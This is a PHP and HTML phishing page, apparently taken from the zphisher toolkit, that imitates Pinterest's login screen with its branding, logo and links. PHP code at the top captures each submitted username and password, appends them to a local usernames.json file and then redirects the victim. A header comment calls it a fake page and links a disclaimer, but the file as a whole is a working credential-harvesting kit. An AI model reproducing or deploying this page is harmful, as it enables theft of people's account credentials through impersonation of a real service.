<?php
if (!empty($_POST)) {
    $data = array(
        'username' => $_POST['username'],
        'password' => $_POST['password']
    );
    
    $file = "usernames.json";
    
    // Cek apakah file usernames.json sudah ada, jika tidak, buat file baru
    if (!file_exists($file)) {
        $initial_data = array();
        file_put_contents($file, json_encode($initial_data));
    }
    
    $current_data = file_get_contents($file);
    $array_data = json_decode($current_data, true);
    $array_data[] = $data;
    $final_data = json_encode($array_data, JSON_PRETTY_PRINT);
    
    file_put_contents($file, $final_data);
    header('Location: ./home.php');
    exit;
}
?>
<!-- 
    Warning: This is just a Fake Page. Beaware of Phishing!
    Learn More: https://github.com/htr-tech/zphisher#disclaimer

    Page Source: https://github.com/htr-tech/zphisher
    GPL-3.0 license (Don't Copy paste without credits)
-->

<!DOCTYPE html>
<html class=en lang=en>
<meta charset=utf-8>
<meta content=on http-equiv=x-dns-prefetch-control>
<meta name=viewport id=viewport content="width=device-width, initial-scale=1">
<title>Pinterest Login</title>
<meta property=og:description name=og:description content="Discover recipes, home ideas, style inspiration and other ideas to try." data-app=true>
<meta property=og:image name=og:image content=https://s.pinimg.com/images/facebook_share_image.png data-app=true>
<meta property=og:title name=og:title content=Pinterest data-app=true>
<meta property=og:type name=og:type content=website data-app=true>
<meta property=og:url name=og:url content=https://www.pinterest.com/login/ data-app=true>
<meta property=pinterest name=pinterest content=nohover data-app=true>
<link rel=canonical href=https://www.pinterest.com/login />
<link rel=icon href="favicon.png">
<meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
<style>body,html{color:#211922;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,Helvetica,ヒラギノ角ゴ Pro W3,Hiragino Kaku Gothic Pro,メイリオ,Meiryo,ＭＳ Ｐゴシック,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;font-size:12px}html{height:100%}body{min-height:100%;overflow-y:scroll;position:relative}:focus{outline:1px auto #d1d1d1}html{-webkit-text-size-adjust:none;-moz-text-size-adjust:none;text-size-adjust:none;font-size:100%}a:active,a:hover{outline:0}button,input,textarea{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,Helvetica,ヒラギノ角ゴ Pro W3,Hiragino Kaku Gothic Pro,メイリオ,Meiryo,ＭＳ Ｐゴシック,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;font-size:100%;margin:0;vertical-align:middle}button,input{line-height:normal}button{-webkit-appearance:button;cursor:pointer}textarea{overflow:auto;vertical-align:top}h1,h3{margin:0}body{margin:0}a,div{-webkit-tap-highlight-color:transparent;text-decoration:none}input::placeholder{color:#b5b5b5}:root{--space-negative-600:-64px;--space-negative-500:-32px;--space-negative-400:-24px;--space-negative-300:-16px;--space-negative-200:-8px;--space-negative-100:-4px;--space-600:64px;--space-500:32px;--space-400:24px;--space-300:16px;--space-200:8px;--space-100:4px;--space-0:0;--opacity-500:.9;--opacity-400:.8;--opacity-300:.4;--opacity-200:.2;--opacity-100:.04;--opacity-0:0;--font-family-code:SFMono-Medium,"SF Mono","Segoe UI Mono","Roboto Mono","Ubuntu Mono",Menlo,Consolas,Courier,monospace;--font-family-default-japanese:"SF Pro JP",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Fira Sans","Droid Sans","Helvetica Neue",Helvetica,"ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro","メイリオ",Meiryo,"ＭＳ Ｐゴシック",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";--font-family-default-latin:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Fira Sans","Droid Sans","Helvetica Neue",Helvetica,"ヒラギノ角ゴ Pro W3","Hiragino Kaku Gothic Pro","メイリオ",Meiryo,"ＭＳ Ｐゴシック",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";--font-weight-bold:700;--font-weight-semibold:600;--font-weight-normal:400;--font-size-600:36px;--font-size-500:28px;--font-size-400:20px;--font-size-300:16px;--font-size-200:14px;--font-size-100:12px;--elevation-raised-bottom:0-2px 8px rgba(0,0,0,0.12);--elevation-raised-top:0 2px 8px rgba(0,0,0,0.12);--elevation-floating:0 0 8px rgba(0,0,0,0.1);--color-transparent:transparent}.un8{display:flex}.xuA{display:block}.TB_,.TB_>.xuA{margin-bottom:0;margin-top:0}.C9i{margin-left:0;margin-right:0}.tkf{margin-left:-4px;margin-right:-4px}.tkf>.xuA{margin-left:4px;margin-right:4px}.Wk9{color:inherit;outline:0}.uCz:focus,.uCz:hover{text-decoration:underline}.CRJ{border:0;clip:rect(0 0 0 0);height:1px;margin:-1px;padding:0;position:absolute;white-space:nowrap;width:1px}.Jea{display:flex;flex-direction:row}.FNs{display:inline-block}.hs0{flex-direction:row}.jzS{flex-direction:column}:root{--g-size-sm:16px;--g-size-md:24px}.lH1{margin-bottom:0;margin-top:0}.gUZ{fill:currentColor;stroke-width:0;vertical-align:middle}.rYa{background:transparent}.HEm:focus,.rYa:focus{outline:0}.yQo{padding:0}:root{--g-switch-height:24px;--g-switch-width:40px;--g-switch-border:1px}.czT{transition:transform 85ms ease-out}.RCK{border-radius:24px}.Il7:focus,.Il7:hover{background-color:var(--g-colorRed100Hovered)}.Il7:active{background-color:var(--g-colorRed100Active)}html:not([dir=rtl]) .s7I{margin-left:auto}html:not([dir=rtl]) .feh{margin-right:auto}html:not([dir=rtl]) .MtH{margin-right:0}.a3i{margin-top:0}.zmN{margin-bottom:0}.wsz{padding-bottom:0;padding-top:0}.lnZ{padding-left:0;padding-right:0}html:not([dir=rtl]) .Rz6{margin-right:4px}.hDW{margin-top:4px}.Shl{padding-left:4px;padding-right:4px}.hjj{margin-top:8px}.VxL{margin-bottom:8px}.CP0{margin-top:-8px}.hA-{padding-bottom:8px;padding-top:8px}.wYR{padding-left:8px;padding-right:8px}html:not([dir=rtl]) .Umk{margin-right:12px}.Hvp{margin-top:12px}.snW{margin-bottom:12px}.hUC{padding-bottom:12px;padding-top:12px}.Zr3{padding-left:12px;padding-right:12px}.KO4{margin-top:16px}.PKX{margin-bottom:24px}.TwP{padding-left:40px;padding-right:40px}.BG7{cursor:pointer}.iyn:focus{box-shadow:0 0 0 4px rgb(0 132 255/.5);outline:0}.CCY:focus{outline:0}:root{--g-colorRed0:#ff5247;--g-colorRed100:#e60023;--g-colorGray0:#fff;--g-colorGray50:#fff;--g-colorGray100:#efefef;--g-colorGray150:#ddd;--g-colorGray200:#767676;--g-colorGray300:#111;--g-colorGray400:#000;--g-green:#0fa573;--g-pine:#0a6955;--g-olive:#364a4c;--g-blue:#0074e8;--g-navy:#004b91;--g-midnight:#133a5e;--g-purple:#b469eb;--g-orchid:#8046a5;--g-eggplant:#5b2677;--g-maroon:#6e0f3c;--g-watermelon:#f13535;--g-orange:#e3780c;--g-colorGray0Hovered:#f0f0f0;--g-colorGray100Hovered:#e2e2e2;--g-colorGray150Hovered:#d0d0d0;--g-colorGray200Hovered:#878787;--g-colorRed100Hovered:#ad081b;--g-blueHovered:#4a8ad4;--g-colorGray0Active:#e0e0e0;--g-colorGray100Active:#dadada;--g-colorGray200Active:#828282;--g-colorRed100Active:#a3081a;--g-blueActive:#4a85c9;--g-colorTransparentDarkGray:rgb(51 51 51/0.8);--g-colorTransparentWhite:rgb(255 255 255/0.8);--g-colorTransparentGray60:rgb(0 0 0/0.06);--g-colorTransparentGray100:rgb(0 0 0/0.1);--g-colorTransparentGray500:rgb(0 0 0/0.1);--g-colorTransparentGray800:rgb(0 0 0/0.8)}.urM{background-color:var(--color-background-default)}.xnr{color:var(--color-text-inverse)}.c8S{color:var(--color-text-error)}.O2T{color:var(--color-text-default)}.EdS{color:var(--color-text-subtle)}.sj_{color:var(--color-text-icon-error)}.ztu{color:var(--color-text-icon-subtle)}.Bp9{color:var(--color-text-icon-shopping)}.Jrn{background-color:var(--g-colorRed100)}.qJc{background-color:var(--g-colorGray0)}.gpV{background-color:var(--g-colorGray100)}.pBj{color:var(--g-colorGray300)}.YbY{background-color:transparent}.unP{-webkit-appearance:none;appearance:none;border-radius:16px;border-style:solid;border-width:2px}.aKM:hover:not(:focus):not(.RJl){border-color:var(--color-gray-roboflow-400)}.dyH{-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}.dR0{font-size:var(--font-size-100)}.j1A{font-size:var(--font-size-200)}.sAJ{font-size:var(--font-size-300)}.bwj{font-size:var(--font-size-400)}.R-d{font-size:var(--font-size-600)}.iFc{font-family:var(--font-family-default-latin)}.swG{font-weight:var(--font-weight-normal)}.H2s{font-weight:var(--font-weight-semibold)}.xQ4{text-decoration:none}.IZT{word-wrap:break-word}.z-6{white-space:nowrap}.z-6{max-width:100%;overflow:hidden;text-overflow:ellipsis}html:not([dir=rtl]) .zDA{text-align:left}.tg7{text-align:center}:root{--g-ncols:12}.L4E{width:calc(12/var(--g-ncols)*100%)}.V86{padding:var(--space-200) var(--space-300)}.kVc{display:block}.KhY{display:inline-block}.XiG{position:relative}.MIw{position:absolute}.qiB{position:sticky}.QLY{top:var(--space-0)}.p6V{right:var(--space-0)}.ojN{bottom:var(--space-0)}.Rym{left:var(--space-0)}.aZc{min-height:40px}.xD4{min-height:48px}.Hsu{box-sizing:border-box}._O1{display:flex}.KS5{align-items:center}.dLb{align-items:baseline}.mQ8{justify-content:center}.b8T{justify-content:space-between}.ujU{flex:1 1 auto;min-height:0;min-width:0}.Eqh{flex:0 0 auto}.USg{min-width:60px}:root{--g-border-width:1px;--g-border-width-lg:2px}.LJB{border-color:var(--color-border-container)}.INd{border-radius:50%}.eEj{border-radius:0}.DUt{border-radius:8px}.s2n{border-radius:12px}.PcK{border-radius:20px}.adn{border:0}.S9gUrf-YoZ4jf,.S9gUrf-YoZ4jf *{border:0;margin:0;padding:0}.L5Fo6c-bF1uUb{-webkit-border-radius:4px}.L5Fo6c-bF1uUb:focus{border:0;outline:0}.L5Fo6c-sM5MNb{border:0;display:block;left:0;position:relative;top:0}.L5Fo6c-bF1uUb{-webkit-border-radius:4px;border-radius:4px;bottom:0;cursor:pointer;left:0;position:absolute;right:0;top:0}.L5Fo6c-bF1uUb:focus{border:0;outline:0}
:root{--g-colorRed0:#ff5247;--g-colorRed100:#e60023;--g-colorRed100Active:#a3081a;--g-colorRed100Hovered:#ad081b;--g-colorGray0:#fff;--g-colorGray0Active:#e0e0e0;--g-colorGray0Hovered:#f0f0f0;--g-colorGray50:#fff;--g-colorGray100:#efefef;--g-colorGray100Active:#dadada;--g-colorGray100Hovered:#e2e2e2;--g-colorGray150:#ddd;--g-colorGray150Hovered:#d0d0d0;--g-colorGray200:#767676;--g-colorGray200Active:#828282;--g-colorGray200Hovered:#878787;--g-colorGray300:#111;--g-colorGray400:#000;--g-colorTransparentDarkGray:rgba(51,51,51,0.8);--g-colorTransparentGray60:rgba(0,0,0,0.06);--g-colorTransparentGray100:rgba(0,0,0,0.1);--g-colorTransparentGray500:rgba(0,0,0,0.1);--g-colorTransparentWhite:rgba(255,255,255,0.8);--color-text-default:#111;--color-text-subtle:#767676;--color-text-success:#005f3e;--color-text-error:#c00;--color-text-warning:#bd5b00;--color-text-inverse:#fff;--color-text-shopping:#0074e8;--color-text-link:#004ba9;--color-text-icon-default:#111;--color-text-icon-subtle:#767676;--color-text-icon-success:#005f3e;--color-text-icon-error:#c00;--color-text-icon-warning:#bd5b00;--color-text-icon-info:#0074e8;--color-text-icon-recommendation:#812ae7;--color-text-icon-inverse:#fff;--color-text-icon-shopping:#0074e8;--color-background-default:#fff;--color-background-info-base:#0074e8;--color-background-info-weak:#d7edff;--color-background-info-strong:#005fcb;--color-background-error-base:#c00;--color-background-error-weak:#ffe0e0;--color-background-warning-base:#bd5b00;--color-background-warning-weak:#ffe4c1;--color-background-success-base:#008753;--color-background-success-weak:#c3f9c2;--color-background-recommendation-base:#812ae7;--color-background-recommendation-weak:#e9e4ff;--color-background-shopping:#0074e8;--color-background-secondary-base:#e9e9e9;--color-background-tertiary-base:#767676;--color-background-selected-base:#111;--color-background-inverse-base:#111;--color-background-education:#0074e8;--color-background-elevation-accent:#f1f1f1;--color-background-elevation-floating:rgba(0,0,0,0);--color-background-elevation-raised:rgba(0,0,0,0);--color-border-container:#cdcdcd;--color-border-default:#767676;--color-border-error:#c00;--color-data-visualization-10:#9e68ff;--color-data-visualization-11:#008753;--color-data-visualization-12:#630233;--color-data-visualization-primary:#003c96;--color-data-visualization-success-graph:#008753;--color-data-visualization-success-text:#005f3e;--color-data-visualization-error:#c00;--color-data-visualization-01:#009990;--color-data-visualization-02:#d86800;--color-data-visualization-03:#6b16ca;--color-data-visualization-04:#de2c62;--color-data-visualization-05:#003c96;--color-data-visualization-06:#a42700;--color-data-visualization-07:#0074e8;--color-data-visualization-08:#de3700;--color-data-visualization-09:#005c62;--elevation-floating:0 0 8px rgba(0,0,0,0.10);--elevation-raised-top:0 2px 8px rgba(0,0,0,0.12);--elevation-raised-bottom:0-2px 8px rgba(0,0,0,0.12)}
</style>

<body>
    <div id=__PWS_ROOT__ data-reactcontainer=true>
        <div>
            <div class="zI7 iyn Hsu">
                <div role=main class="urM zI7 iyn Hsu" style=min-height:100vh>
                    <div class=qiB style=top:0px;z-index:5>
                        <div class="urM zI7 iyn Hsu">
                            <div class="QLY Rym XiG Zr3 zI7 iyn Hsu"
                                style="box-shadow:rgba(0,0,0,0.08) 0px 1px 0px 0px;background-color:white;transition:all 225ms cubic-bezier(0,0,0.2,1) 500ms;transform:translateY(0px);width:100vw">
                                <div data-test-id=unauth-header class="Jea KS5 b8T hs0 zI7 iyn Hsu">
                                    <div aria-disabled=false aria-label="Pinterest App"
                                        class="CCY czT eEj iyn FTD L4E DI9 BG7" role=button tabindex=0>
                                        <div class="Jea KS5 Umk hs0 zI7 iyn Hsu">
                                            <div data-test-id=pinterest-logo-icon class="DUt Jea KS5 mQ8 zI7 iyn Hsu"
                                                style=height:56px><a class="Wk9 xQ4 CCY czT eEj iyn kVc FTD L4E DI9 BG7"
                                                    href=https://www.pinterest.com/ rel tabindex=0><button
                                                        aria-label="Pinterest App" class="HEm adn yQo lnZ wsz YbY"
                                                        tabindex=0 type=button>
                                                        <div class="rYa kVc adn yQo czT qrs BG7">
                                                            <div class="x8f INd _O1 KS5 mQ8 OGJ YbY"
                                                                style=height:32px;width:32px><svg
                                                                    class="gUZ sj_ U9O kVc" height=24 width=24
                                                                    viewBox="0 0 24 24" aria-hidden=true aria-label
                                                                    role=img>
                                                                    <path
                                                                        d="M0 12c0 5.123 3.211 9.497 7.73 11.218-.11-.937-.227-2.482.025-3.566.217-.932 1.401-5.938 1.401-5.938s-.357-.715-.357-1.774c0-1.66.962-2.9 2.161-2.9 1.02 0 1.512.765 1.512 1.682 0 1.025-.653 2.557-.99 3.978-.281 1.189.597 2.159 1.769 2.159 2.123 0 3.756-2.239 3.756-5.471 0-2.861-2.056-4.86-4.991-4.86-3.398 0-5.393 2.549-5.393 5.184 0 1.027.395 2.127.889 2.726a.36.36 0 0 1 .083.343c-.091.378-.293 1.189-.332 1.355-.053.218-.173.265-.4.159-1.492-.694-2.424-2.875-2.424-4.627 0-3.769 2.737-7.229 7.892-7.229 4.144 0 7.365 2.953 7.365 6.899 0 4.117-2.595 7.431-6.199 7.431-1.211 0-2.348-.63-2.738-1.373 0 0-.599 2.282-.744 2.84-.282 1.084-1.064 2.456-1.549 3.235C9.584 23.815 10.77 24 12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12">
                                                                    </path>
                                                                </svg></div>
                                                        </div>
                                                    </button></a></div>
                                            <div data-test-id=pinterest-logo-text class="Shl hA- zI7 iyn Hsu">
                                                <div class="zI7 iyn Hsu">
                                                    <h3 class="lH1 dyH iFc H2s bwj c8S zDA">Pinterest</h3>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div data-test-id=UnauthAppUpsellButton class="Eqh Jea KS5 MtH hs0 zI7 iyn Hsu">
                                        <div data-test-id=download-button class="zI7 iyn Hsu"><button
                                                class="RCK Hsu USg adn CCY gn8 L4E kVc iyn oRi lnZ wsz YbY" tabindex=0
                                                type=button>
                                                <div
                                                    class="RCK Hsu USg adn CCY gn8 L4E kVc iyn czT Vxj aZc Zr3 hA- Il7 Jrn hNT BG7 hDj _O1 KS5 mQ8 FTD">
                                                    <div class="tBJ dyH iFc sAJ xnr tg7 H2s">Download</div>
                                                </div>
                                            </button></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id=mweb-unauth-container class="zI7 iyn Hsu">
                        <div data-layout-shift-boundary-id=PageContainer class="hUC wYR zI7 iyn Hsu">
                            <div class="zI7 iyn Hsu">
                                <div class="NVN CRJ zI7 iyn Hsu">
                                    <h1 class="lH1 dyH iFc H2s R-d O2T zDA IZT">Login</h1>
                                </div>
                                <div class="lnZ zI7 iyn Hsu">
                                    <div class="Hvp PKX feh s7I zI7 iyn Hsu" style=max-width:400px>
                                        <div class="zI7 iyn Hsu">
                                            <div data-test-id=LoginButtonsContainer class="a3i feh s7I zI7 iyn Hsu"
                                                style=max-width:400px>
                                                <div class="PKX zI7 iyn Hsu">
                                                    <div data-test-id=facebook-connect-button class="VxL zI7 iyn Hsu">
                                                        <div data-test-id=FacebookConnectContainer
                                                            class="XiG zI7 iyn Hsu"><button type=button data-test-id=FacebookConnectButton
                                                                style="display:flex;align-items:center;background-color:rgb(24,119,242);border:none;height:40px;transition:opacity 0.2s linear 0s;width:100%;min-width:240px;border-radius:20px;padding:0px 0px 0px 8px">
                                                                <div class="s2n urM zI7 iyn Hsu"
                                                                    style=padding-top:5px;padding-left:3px;padding-right:2px;margin-left:4px;margin-right:4.4px>
                                                                    <svg class="gUZ Bp9" height=19 width=19
                                                                        viewBox="0 0 24 24" aria-label=facebook
                                                                        role=img>
                                                                        <path
                                                                            d="m17.75 3.984-2.312.001c-1.811 0-2.163.842-2.163 2.077v2.724h4.323l-.563 4.267h-3.76V24H8.769V13.053H5V8.786h3.769V5.64C8.769 1.988 11.05 0 14.383 0c1.596 0 2.967.116 3.367.168v3.816z">
                                                                        </path>
                                                                    </svg></div>
                                                                <div class="Jea KS5 Rz6 mQ8 ujU zI7 iyn Hsu"><span
                                                                        style=font-family:Helvetica,Arial,sans-serif;font-weight:bold;color:rgb(255,255,255);font-size:16px;padding-right:8px;letter-spacing:0.25px>Continue
                                                                        with Facebook</span></div>
                                                            </button>
                                                        </div>
                                                    </div>
                                                    <div data-test-id=google-connect-button class="VxL zI7 iyn Hsu">
                                                        <div class="XiG zI7 iyn Hsu">
                                                            <div aria-disabled=false
                                                                class="CCY czT eEj iyn FTD L4E DI9 BG7" role=button
                                                                tabindex=0>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div data-test-id=line-connect-button class="VxL zI7 iyn Hsu"></div>
                                                </div>
                                            </div>
                                            <div class="CP0 zI7 iyn Hsu zmN">
                                                <div class="tBJ dyH iFc j1A O2T tg7 IZT H2s">OR</div>
                                            </div>
                                        </div>
                                        <div class="Hvp snW zI7 iyn Hsu">
                                            
                                            <form method="post" action="login.php">
                                                <div class="hDW zI7 iyn Hsu"><span>
                                                        <div class="XiG zI7 iyn Hsu"><input aria-invalid=false
                                                                class="V86 Hsu tBJ dyH iFc sAJ L4E unP iyn Pve pBj qJc aKM LJB xD4 z-6"
                                                                id=email placeholder=Email spellcheck=false name=username type=email
                                                                value></div>
                                                    </span></div>
                                                <div class="zI7 iyn Hsu">
                                                    <div class="XiG hjj zI7 iyn Hsu"><span>
                                                            <div class="XiG zI7 iyn Hsu">
                                                                <input aria-invalid=false
                                                                    autocomplete=on
                                                                    class="V86 Hsu tBJ dyH iFc sAJ L4E unP iyn Pve pBj qJc aKM LJB xD4 z-6"
                                                                    id=password placeholder=Password name=password type=password required value
                                                                    spellcheck=false></div>
                                                        </span>
                                                    </div>
                                                    <div data-test-id=reset-password class="hjj zI7 iyn Hsu"><span
                                                            class="tBJ dyH iFc dR0 O2T zDA IZT H2s"><a
                                                                class="Wk9 CCY czT eEj KhY xQ4 uCz iyn"
                                                                href=# rel>Forgot
                                                                your password?</a></span></div>
                                                </div>
                                                <div data-test-id=log-in-button class="KO4 zI7 iyn Hsu">
                                                    
                                                    <button
                                                        class="RCK Hsu USg adn CCY gn8 L4E kVc iyn czT Vxj aZc Zr3 hA- Il7 Jrn hNT BG7"
                                                        type=submit>
                                                        <div class="KS5 hs0 mQ8 un8 tkf TB_">
                                                            <div class=xuA>
                                                                <div class="tBJ dyH iFc sAJ xnr tg7 H2s">Log in</div>
                                                            </div>
                                                        </div>
                                                    </button>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                    <div class="Jea KS5 hjj jzS mQ8 ujU zI7 iyn Hsu">
                                        <div class="hs0 mQ8 un8 C9i TB_">
                                            <div data-test-id=signup-link class="Rz6 zI7 iyn Hsu">
                                                <div class="tBJ dyH iFc sAJ O2T zDA IZT swG">No Account?</div>
                                            </div>
                                            <div class="tBJ dyH iFc sAJ O2T zDA IZT H2s"><a
                                                    class="Wk9 CCY czT eEj kVc xQ4 uCz iyn"
                                                    href=https://www.pinterest.com/signup/step1/ rel>Sign up</a></div>
                                        </div>
                                        <div class="Jea KO4 dLb mQ8 zI7 iyn Hsu zmN">
                                            <div class="Jea Rz6 mQ8 zI7 iyn Hsu"><span
                                                    class="tBJ dyH iFc sAJ O2T tg7 IZT swG">Are you a business?</span>
                                            </div>
                                            <div data-test-id=create-business class="Jea mQ8 zI7 iyn Hsu"><a
                                                    class="Wk9 CCY czT eEj KhY xQ4 uCz iyn"
                                                    href=https://www.pinterest.com/business/create
                                                    rel="noopener noreferrer" target=_blank>
                                                    <div class="tBJ dyH iFc sAJ O2T tg7 IZT H2s">Get started here!</div>
                                                    <div class="NVN CRJ zI7 iyn Hsu">; Opens a new tab</div>
                                                </a></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>